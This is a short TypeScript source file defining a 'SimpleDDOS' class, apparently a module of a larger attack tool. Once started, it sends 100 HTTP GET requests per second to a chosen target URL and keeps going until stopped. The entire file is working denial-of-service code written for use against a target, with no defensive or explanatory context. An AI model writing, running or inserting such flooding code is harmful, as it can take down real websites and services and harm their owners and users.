import { Algorithm } from './algorithm'
import request from 'superagent'

export default class SimpleDDOS extends Algorithm {
  private _working: boolean
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  private _interval: any

  constructor (target: string) {
    super(target)
    this._working = false
    this._interval = null
  }

  isInstalled (): Promise<boolean> {
    return Promise.resolve(true)
  }

  install (): Promise<void> {
    return Promise.resolve()
  }

  start (): Promise<void> {
    if (this._working) return Promise.resolve()
    this._interval = setInterval(this._worker.bind(this), 1000)
    this._working = true
    return Promise.resolve()
  }

  stop (): Promise<void> {
    // eslint-disable-next-line @typescript-eslint/no-unsafe-argument
    clearInterval(this._interval)
    this._working = false
    return Promise.resolve()
  }

  private _worker () {
    for (let i = 0; i < 100; i += 1) {
      request.get(this.target).end(() => undefined)
      this.emit('request')
    }
  }
}
